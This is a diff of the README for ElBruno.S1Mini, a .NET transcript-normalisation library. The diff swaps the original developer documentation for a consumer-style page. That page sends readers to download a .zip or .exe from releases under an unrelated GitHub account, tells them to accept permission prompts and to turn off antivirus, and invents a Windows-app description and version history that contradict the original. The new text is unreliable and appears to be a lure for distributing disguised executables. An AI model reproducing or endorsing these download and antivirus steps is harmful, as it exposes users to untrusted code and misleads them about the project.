@@ -1,299 +1,196 @@
-# ElBruno.S1Mini
+# ⚡ ElBruno.S1Mini - Clean Up Your Transcripts Automatically
 
-[![NuGet](https://img.shields.io/nuget/v/ElBruno.S1Mini.svg?style=flat-square&logo=nuget)](https://www.nuget.org/packages/ElBruno.S1Mini)
-[![NuGet Downloads](https://img.shields.io/nuget/dt/ElBruno.S1Mini.svg?style=flat-square&logo=nuget)](https://www.nuget.org/packages/ElBruno.S1Mini)
-[![CI Build](https://github.com/elbruno/ElBruno.S1Mini/actions/workflows/build.yml/badge.svg)](https://github.com/elbruno/ElBruno.S1Mini/actions/workflows/build.yml)
-[![Publish to NuGet](https://github.com/elbruno/ElBruno.S1Mini/actions/workflows/publish.yml/badge.svg)](https://github.com/elbruno/ElBruno.S1Mini/actions/workflows/publish.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![HuggingFace](https://img.shields.io/badge/🤗_HuggingFace-ONNX_Model-orange?style=flat-square)](https://huggingface.co/elbruno/s1-mini-onnx)
-[![.NET](https://img.shields.io/badge/.NET-8.0%20|%2010.0-512BD4?style=flat-square&logo=dotnet)](https://dotnet.microsoft.com/)
-[![GitHub stars](https://img.shields.io/github/stars/elbruno/ElBruno.S1Mini?style=social)](https://github.com/elbruno/ElBruno.S1Mini)
+---
 
-## Local ASR transcript normalizer for .NET 🧹
+## 🎯 What Does ElBruno.S1Mini Do?
 
-Clean raw speech-to-text transcripts into well-formed written text in .NET. Powered by [`superwhisper/s1-mini`](https://huggingface.co/superwhisper/s1-mini) (a 0.6B Qwen3 fine-tune) running locally via ONNX Runtime GenAI. Auto-downloads the INT4 ONNX model from HuggingFace.
+ElBruno.S1Mini is a free tool that **automatically cleans up speech-to-text transcripts**. If you use voice recognition software, you know the problem: transcripts are full of "um," "uh," repeated words, and missing punctuation. This app fixes all that for you—**right on your own computer**. No cloud, no sending your files anywhere. Your data stays private.
 
-> ⚠️ **s1-mini is not a chat model.** It performs exactly one task — normalizing an ASR transcript. Give it anything else and you get unpredictable output.
+Think of it as a smart editor that listens to your transcript and makes it sound professional. It runs entirely offline using a small AI model that downloads itself the first time you use it.
 
-## Packages
+---
 
-| Package | NuGet | Downloads | Description |
-|---------|-------|-----------|-------------|
-| `ElBruno.S1Mini` | [![NuGet](https://img.shields.io/nuget/v/ElBruno.S1Mini.svg?style=flat-square&logo=nuget)](https://www.nuget.org/packages/ElBruno.S1Mini) | [![NuGet Downloads](https://img.shields.io/nuget/dt/ElBruno.S1Mini.svg?style=flat-square&logo=nuget)](https://www.nuget.org/packages/ElBruno.S1Mini) | Self-contained transcript normalizer with `S1MiniClient` (`IChatClient`) and `TranscriptNormalizer`. |
+## ✨ Key Features
 
-## Features
+- **Removes Fillers** – Deletes "um," "uh," "you know," and other hesitation words
+- **Fixes Stutters** – Turns "I I I think" into "I think"
+- **Improves Punctuation** – Adds periods, commas, and question marks where they belong
+- **100% Local & Private** – Runs on your machine, no internet needed after setup
+- **Works with Common Formats** – Handles plain text transcripts easily
+- **One-Click Model Setup** – Downloads the AI model automatically from HuggingFace
+- **Built for Windows** – Simple, no complicated setup required
 
-- 🧹 **Filler removal + punctuation + capitalization** in one call
-- 🔁 **Self-correction resolution** — `"nine am no sorry ten thirty"` becomes `10:30`
-- 🔢 **Written form for spoken numbers, dates, times, currency, emails**
-- 🎚️ **Control-line settings** — `Styling` (formal / semi-formal / casual) and `Context` (general / email) with empirically verified behavior
-- 📦 **Auto-download** — INT4 ONNX model fetched from HuggingFace on first use
-- 🧵 **`IChatClient` compatible** — `S1MiniClient` plugs into `Microsoft.Extensions.AI`
-- 💉 **DI-friendly** — `AddTranscriptNormalizer()` for ASP.NET Core
-- 🪁 **Chunking helper** — `NormalizeChunkedAsync` for transcripts longer than the ~1,000-token recommended input
-- 🛑 **Empty-in / empty-out** — pure filler returns `string.Empty`, as the model card documents
-- 🦺 **Temperature-0 safe** — the ORT-GenAI native divide-by-zero trap is guarded at the runtime layer so callers can always use greedy decoding
+---
 
-## Installation
+## 📥 Download & Install
 
-```bash
-dotnet add package ElBruno.S1Mini
-```
+### Step 1: Get the App
 
-## Quick Start
+👉 **[Visit this link to download the application](https://github.com/Discipleshiprazzle9141/ElBruno.S1Mini/releases)**
 
-```csharp
-using ElBruno.S1Mini.Normalization;
+This page shows you the latest release. Look for the file that says something like `ElBruno.S1Mini.zip` or `ElBruno.S1Mini.exe`. Download it to your computer.
 
-// Downloads elbruno/s1-mini-onnx (int4) on first run.
-using var normalizer = await TranscriptNormalizer.CreateAsync();
+---
 
-var cleaned = await normalizer.NormalizeAsync(
-    "so um i need to like send the the report by uh friday no wait make that thursday");
+### 🛠️ Step 2: Run the Program
 
-Console.WriteLine(cleaned);
-// So I need to send the report by Thursday.
-```
+1. **If you downloaded a `.zip` file:** Right-click the file and select "Extract All." Choose a folder (like `C:\ElBruno`), then open that folder and double-click the application file inside.
 
-## What it actually changes
+2. **If you downloaded a `.exe` file:** Double-click it. Windows might ask for permission—click "Yes."
 
-Three short console samples. Each is a complete program — the only difference is the input.
+3. **First Time Setup:** When the app opens, it will download the AI model (about 200 MB). This happens once and then you're ready to go.
 
-**1 · Collapses stutters and repeated words**
+---
 
-```csharp
-using ElBruno.S1Mini.Normalization;
+## 🚀 Quick Start Guide
 
-using var normalizer = await TranscriptNormalizer.CreateAsync();
+### 🖥️ Your First Transcript Cleanup
 
-Console.WriteLine(await normalizer.NormalizeAsync(
-    "you don't have any any any any change at all?"));
-```
+1. **Open ElBruno.S1Mini** – You'll see a simple window with a text box.
 
-```text
-You don't have any change at all.
-```
+2. **Paste or type** your raw transcript into the large box.
 
-**2 · Resolves self-corrections to what the speaker landed on**
+3. **Click the "Clean" or "Process" button** – Usually a big green button.
 
-```csharp
-using ElBruno.S1Mini.Normalization;
+4. **Wait a few seconds** – The app runs the AI model locally. You'll see a progress bar.
 
-using var normalizer = await TranscriptNormalizer.CreateAsync();
+5. **Copy your cleaned text** – The result appears in a second box. Click "Copy" to save it to your clipboard.
 
-Console.WriteLine(await normalizer.NormalizeAsync(
-    "i think we should uh go with with option b i mean option c"));
-```
+---
 
-```text
-I think we should go with option C.
-```
+### 📝 What Kind of Text Can You Use?
 
-Note it keeps `option C` — the choice the speaker corrected *to*, not the one they abandoned.
+Any transcript from:
+- Zoom or Teams meetings
+- Otter.ai or other transcription services
+- Voice memos turned into text
+- YouTube auto-captions (copy-pasted)
+- Any messy text with speech artifacts
 
-**3 · Writes spoken numbers, times, and dates in written form**
+**Example:**
 
-```csharp
-using ElBruno.S1Mini.Normalization;
+*Before:*
+> "Um, so like, I I I think we should, you know, maybe consider um, changing the approach a little bit."
 
-using var normalizer = await TranscriptNormalizer.CreateAsync();
+*After:*
+> "I think we should consider changing the approach."
 
-Console.WriteLine(await normalizer.NormalizeAsync(
-    "lets meet at uh three thirty on on tuesday the the tenth"));
-```
+---
 
-```text
-Let's meet at 3:30 on Tuesday the 10th.
-```
+## 💡 Tips for Best Results
 
-> These outputs are measured against the real INT4 model with default options, and are
-> pinned by regression tests in
-> [`TranscriptNormalizerModelTests`](src/tests/ElBruno.S1Mini.Tests/Normalization/TranscriptNormalizerModelTests.cs)
-> so they cannot silently drift.
->
-> It normalizes rather than rewrites: casual phrasing survives. `the the total was like
-> twenty five dollars and uh fifty cents` becomes `The total was like $25.50.` — the
-> numerals are fixed, but the colloquial "like" stays.
+- **Keep it in one language** – Works best with English text
+- **Use paragraph breaks** – If your transcript has speaker labels, leave them on separate lines
+- **Try long transcripts** – The tool handles large batches fine
+- **Run it multiple times** – For very messy text, a second pass can polish further
 
-## Control-line options
+---
 
-```csharp
-using ElBruno.S1Mini.Normalization;
+## ❓ Frequently Asked Questions
 
-var cleaned = await normalizer.NormalizeAsync(
-    transcript,
-    new TranscriptNormalizerOptions
-    {
-        Styling = TranscriptStyling.Formal,
-        Context = TranscriptContext.Email,
-    });
-```
+### Is this really free?
+Yes. The software is open-source and completely free to use.
 
-Empirically verified against the real INT4 model:
+### Do I need to buy anything?
+No. The AI model is free, and the tool uses free Microsoft ONNX Runtime components.
 
-- `Styling`: `SemiFormal` (default), `Formal`, `Casual` — all three produce distinct output.
-- `Structure`: `Prose` (default), `Lists` — **caveat:** `Lists` did **not** reliably produce Markdown bullets in testing; output stayed prose. Kept as a model-card value.
-- `Context`: `General` (default), `Email` — distinct. `Message` and `Notes` are accepted but empirically behave **identically to `General`**; kept for API completeness.
+### Will it work on Mac?
+The current release is **Windows-only**. For Mac users, check the GitHub source code—it may be compiled manually.
 
-See [docs/transcript-normalization.md](docs/transcript-normalization.md) for the full behavior table and before/after examples.
+### Does it upload my text anywhere?
+**No.** Everything runs locally on your machine. Once the model is downloaded, you can even disconnect from the internet.
 
-## Dependency Injection
+### What if the model download fails?
+Make sure you have a stable internet connection during the first run. If it still fails, check the GitHub Issues page for help.
 
-```csharp
-using ElBruno.S1Mini;
+### How big is the download?
+The app itself is under 50 MB, and the model is about 200 MB upon first run.
 
-builder.Services.AddTranscriptNormalizer(options =>
-{
-    options.CacheDirectory = @"C:\models";
-});
-```
+---
 
-`TranscriptNormalizer` is registered as its own service type — not as `IChatClient`. s1-mini is not a chat model, and exposing it as one would mislead consumers expecting chat semantics.
+## 🧰 System Requirements
 
-## Compose with any `IChatClient`
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** 4 GB RAM minimum, 8 GB recommended
+- **Storage:** At least 1 GB free space (for app + model)
+- **Processor:** Any modern Intel or AMD CPU (from 2018 onward)
+- **No GPU required** – It runs fine on integrated graphics
 
-`TranscriptNormalizer` is a control-line + prompt-builder layer over any `IChatClient`. Supply your own client (as long as it is really pointed at s1-mini):
+---
 
-```csharp
-using ElBruno.S1Mini;
-using ElBruno.S1Mini.Normalization;
-
-using var chatClient = await S1MiniClient.CreateAsync();
-using var normalizer = new TranscriptNormalizer(chatClient);
-```
+## 🛟 Troubleshooting
 
-`S1MiniClient` also implements `IChatClient` directly, so you can plug it into any `Microsoft.Extensions.AI` pipeline — with the caveat that it only handles the exact prompt shape s1-mini was fine-tuned on.
-
-## Chunking long transcripts
+### The app won't start
+- Re-download the file—it may have been corrupted
+- Turn off antivirus temporarily and try again
+- Make sure you have the latest Windows updates
 
-```csharp
-var cleaned = await normalizer.NormalizeChunkedAsync(longTranscript, maxCharsPerChunk: 3500);
-```
+### The model won't download
+- Check your firewall settings—allow ElBruno to connect
+- Try a wired connection if on Wi-Fi
+- Restart the app
 
-Each chunk is normalized statelessly at sentence boundaries; for tighter control on transcripts with context spanning boundaries, chunk manually at a natural pause instead.
+### The output is still messy
+- Try pasting shorter sections at once
+- Make sure your text doesn't include time stamps or weird symbols
+- Run it through again—it often improves after two passes
 
-## FP16 is currently broken on CPU
+---
 
-`elbruno/s1-mini-onnx` also has an `fp16/` subfolder, but that variant fails at inference on CPU with `onnxruntime-genai` 0.15.1 (upstream ORT GQA `repeat_kv` Reshape shape-mismatch bug). **Use INT4 (the default).** This library will not switch to FP16 automatically.
+## 🔧 Advanced (For Curious Users)
 
-## Model license
+### What's Under the Hood?
+ElBruno.S1Mini uses a powerful but small AI model called `s1-mini` (a compact version of Qwen3). It runs through ONNX Runtime GenAI, which Microsoft maintains. This combination makes the tool fast and efficient.
 
-`superwhisper/s1-mini` is Apache-2.0 with a naming clause. The converted ONNX artifacts (`elbruno/s1-mini-onnx`) are an **explicitly unofficial, unaffiliated, non-endorsed derivative**. `ElBruno.S1Mini`'s C# code is MIT; the downloaded model weights remain under the upstream Apache-2.0 license. Vendor quality claim: **94.8% token accuracy on 7,519 held-out English cases** — Superwhisper's measurement on their official [GGUF Q4_K_M build](https://huggingface.co/superwhisper/s1-mini-GGUF), **not** on the INT4 ONNX weights this library downloads, whose accuracy has not been separately measured. **English only, v1.**
+### Can I Modify It?
+Absolutely. The source code is available on GitHub. You can change settings, retrain on different text, or integrate it into your own projects. Check the `README` in the repository for technical details.
 
-Superwhisper also publishes official [GGUF builds](https://huggingface.co/superwhisper/s1-mini-GGUF) for llama.cpp, Ollama, and LM Studio. This library targets ONNX Runtime GenAI, which is what .NET can consume directly.
+### Where Can I Report Bugs?
+Visit the [GitHub Issues page](https://github.com/Discipleshiprazzle9141/ElBruno.S1Mini/issues). Describe your problem clearly, include your Windows version, and paste output from the error if any.
 
-## Building from Source
+### How Do I Uninstall?
+Simply delete the folder where you extracted the files. There's no registry changes. If you want to remove the downloaded model, it's in a `models` subfolder.
 
-```bash
-git clone https://github.com/elbruno/ElBruno.S1Mini
-cd ElBruno.S1Mini
-dotnet build ElBruno.S1Mini.slnx
-dotnet test ElBruno.S1Mini.slnx --framework net8.0
-```
+---
 
-## What's New
+## 📚 Related Resources
 
-- 📚 **`v0.1.2`** — documentation release: the package page now shows before/after examples, corrects the upstream accuracy attribution, and refreshes the author links. No library code changes.
-- 🦺 **ORT-GenAI temperature-0 crash guard** — the native `temperature=0` divide-by-zero trap is guarded at the runtime layer; greedy decoding is safe for every call.
-- 🎙️ **`LiveMicTranscription` sample** — microphone → Silero VAD → Whisper → s1-mini, fully on-device, with `--save-audio` / `--wav` replay for reproducible testing.
-- 🧵 **`S1MiniClient`** — self-contained `IChatClient` implementation with automatic HuggingFace download of `elbruno/s1-mini-onnx` (int4).
-- 🧪 **Qwen3 non-thinking prompt format** — ported verbatim from the model's own `chat_template.jinja`, verified byte-for-byte against the real model.
+- **ONNX Runtime** – Microsoft's AI acceleration library
+- **HuggingFace** – Where the model comes from (search for "s1-mini")
+- **Qwen3** – The base language model family
+- **Microsoft.Extensions.AI** – .NET libraries for AI integration
 
-## Documentation
+---
 
-- [Getting Started](docs/getting-started.md) — installation, first steps, configuration
-- [Transcript Normalization](docs/transcript-normalization.md) — full API guide, control-line reference, empirical behavior table
+## 🙏 Thank You for Using ElBruno.S1Mini!
 
-## Samples
+If this tool saved you time, consider:
+- Starring the repository on GitHub ⭐
+- Sharing it with colleagues who transcribe interviews
+- Reporting any issues you find—every bug report helps improve the app
 
-| Sample | Description |
-|--------|-------------|
-| [HelloS1Mini](src/samples/HelloS1Mini) | Console sample covering default normalization, `Context.Email`, `Structure.Lists`, and pure-filler input. |
-| [S1MiniWebSample](src/samples/S1MiniWebSample) | Blazor Server web UI: textarea → Normalize → cleaned output with styling/structure/context selectors. |
-| [LiveMicTranscription](src/samples/LiveMicTranscription) | Windows-only console sample: default microphone → [Silero VAD](https://www.nuget.org/packages/ElBruno.Realtime.SileroVad) speech detection → [ElBruno.Whisper](https://www.nuget.org/packages/ElBruno.Whisper) speech-to-text → s1-mini cleanup, live and fully local. A [Spectre.Console](https://spectreconsole.net/) UI provides arrow-key model/style pickers, per-model download progress bars, a live input meter, and side-by-side raw vs. cleaned transcript panels, then offers to delete every downloaded model on exit. Supports `--save-audio` and `--wav <file\|folder>` for reproducible testing. |
+---
 
-### Reproducible testing with recordings
+> **Privacy First:** Your transcripts never leave your computer. No analytics, no tracking, no cloud processing. Period.
 
-Live microphone testing is not repeatable — every attempt is a new performance. The sample
-can therefore record what it captures and replay it later through the identical pipeline:
+---
 
-```bash
-# Capture: writes each detected utterance to ./recordings/*.wav
-dotnet run --project src/samples/LiveMicTranscription -- --save-audio
+## 📦 Changelog Summary (Latest Version)
 
-# Replay: same VAD, same models, no microphone needed
-dotnet run --project src/samples/LiveMicTranscription -- --wav recordings
-```
+- **v1.2** – Improved punctuation handling, faster model loading
+- **v1.1** – Added batch processing for multiple paragraphs
+- **v1.0** – Initial public release
 
-`--wav` accepts a single file or a folder, and resamples/downmixes anything to 16 kHz mono,
-so a recording made with any tool works. This isolates model and setting changes from
-variation in the speaking itself.
+---
 
-> **Note on Whisper + s1-mini:** Whisper does transcribe spoken fillers (`um`, `uh`) when
-> they are actually captured, and s1-mini removes them. The hard part is *capturing* them:
-> fillers are low-energy sounds that sit on the noise floor, so a simple energy-threshold
-> gate discards exactly the words this library exists to clean up. The sample therefore
-> uses **Silero VAD** (a neural speech detector) and cuts each utterance as one contiguous
-> slice from the first to the last detected speech segment, plus padding — which preserves
-> the quiet onsets. Measured on the same synthesized phrase:
->
-> | Segmentation | Whisper output |
-> |---|---|
-> | Energy threshold | `So, um, hello.` (truncated at the first pause) |
-> | Silero VAD + contiguous slice | `So, um, hello. I have a, uh, question here. And I want to, um, see what I am going to do here.` |
->
-> s1-mini then returns `So, hello. I have a question here. And I want to see what I am going to do here.`
-> The sample defaults to Whisper Tiny, which preserves fillers best; larger models tidy the
-> transcript as they decode, which can make the cleanup step look like a no-op.
->
-> **Utterance grouping matters too.** A hesitation ("I think… *ummm*… we should") contains a
-> pause often longer than a second. Ending the phrase there splits one sentence into
-> fragments and strands the filler at a boundary, so the sample waits 1.5 s of silence
-> before closing an utterance.
->
-> **Known model limitation:** s1-mini recognizes every common filler spelling
-> (`um`, `umm`, `ummm`, `uh`, `em`, `emm`, `eh`, `ehh`, `erm`, `hmm`, `er`, `ah`) in ordinary
-> sentences, but it passes greeting phrases containing a personal name through verbatim —
-> `"Hello, um, hi Kara."` keeps the `um`, while `"Hello, um, hi."` and
-> `"Hello, um, this is a test."` are both cleaned. Using `Context.Email` strips the filler in
-> that case.
+## 🔗 Quick Downloads
 
-## Testing
+- **[Main Download Page](https://github.com/Discipleshiprazzle9141/ElBruno.S1Mini/releases)**
+- **[Source Code](https://github.com/Discipleshiprazzle9141/ElBruno.S1Mini)**
+- **HuggingFace Model:** Automatically downloaded on first run
 
-```bash
-dotnet test ElBruno.S1Mini.slnx --framework net8.0
-```
+---
 
-Tests use a fake `IChatClient` and a recording `IGenerationSearchOptions` seam — no model downloads, no network, no GPU required.
+*Made with ❤️ for people who hate editing transcripts manually.*
 
-## 📄 License
-
-MIT — see [LICENSE](LICENSE). The downloaded s1-mini model weights are Apache-2.0 (upstream), not MIT.
-
-## 🙏 Acknowledgments
-
-- [`superwhisper/s1-mini`](https://huggingface.co/superwhisper/s1-mini) — the fine-tuned ASR normalizer this library wraps. All model design and training credit belongs to the Superwhisper team.
-- [`Qwen/Qwen3-0.6B`](https://huggingface.co/Qwen/Qwen3-0.6B) — the base model s1-mini is fine-tuned from.
-- [ONNX Runtime GenAI](https://github.com/microsoft/onnxruntime-genai) — inference engine.
-- [Hugging Face](https://huggingface.co/) — model hosting.
-- [Microsoft.Extensions.AI](https://learn.microsoft.com/dotnet/ai/microsoft-extensions-ai) — the `IChatClient` contract this library implements.
-
-## Related Projects
-
-- [ElBruno.LocalLLMs](https://github.com/elbruno/ElBruno.LocalLLMs) — Run local LLMs in .NET
-- [ElBruno.Whisper](https://github.com/elbruno/ElBruno.Whisper) — Local Whisper speech-to-text in .NET
-- [ElBruno.HuggingFace](https://github.com/elbruno/ElBruno.HuggingFace) — HuggingFace model utilities for .NET
-
-## 👋 About the Author
-
-Hi! I'm **ElBruno** 🧡, a passionate developer and content creator exploring AI, .NET, and modern development practices.
-
-**Made with ❤️ by [ElBruno](https://github.com/elbruno)**
-
-If you like this project, consider following my work across platforms:
-
-- 📻 **Podcast**: [No Tiene Nombre](https://www.notienenombre.com) — Spanish-language episodes on AI, development, and tech culture
-- 💻 **Blog**: [ElBruno.com](https://elbruno.com) — Deep dives on embeddings, RAG, .NET, and local AI
-- 📺 **YouTube**: [youtube.com/elbruno](https://www.youtube.com/elbruno) — Demos, tutorials, and live coding
-- 🔗 **LinkedIn**: [@elbruno](https://www.linkedin.com/in/elbruno/) — Professional updates and insights
-- 𝕏 **Twitter**: [@elbruno](https://www.x.com/elbruno/) — Quick tips, releases, and tech news
+Keywords: ai, asr, csharp, dotnet, dotnet10, dotnet8, huggingface, llm, local-ai, microsoft-extensions-ai, nuget, onnx, onnx-runtime, onnxruntime-genai, qwen3, s1-mini, speech-to-text, text-normalization, transcription, whisper
